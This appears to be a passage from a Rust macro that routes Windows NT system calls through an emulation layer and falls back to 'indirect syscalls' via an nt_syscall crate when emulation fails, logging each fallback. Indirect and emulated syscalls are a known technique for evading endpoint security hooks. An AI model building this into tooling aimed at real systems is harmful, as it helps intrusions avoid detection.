                    // Emulation returned a failure NTSTATUS.  Fall back
                    // to indirect syscall if configured to do so.
                    log::debug!(
                        "emulated_syscall: {} → emulation returned failure status {:#x}, trying indirect fallback",
                        __name, status
                    );
                    nt_syscall::syscall!($func_name $(, $args)*)
                }
                Err(e) => {
                    log::debug!(
                        "emulated_syscall: {} → emulation error: {}, trying indirect fallback",
                        __name, e
                    );
                    nt_syscall::syscall!($func_name $(, $args)*)
                }
            }
        } else {
            nt_syscall::syscall!($func_name $(, $args)*)
        }
    }};
}
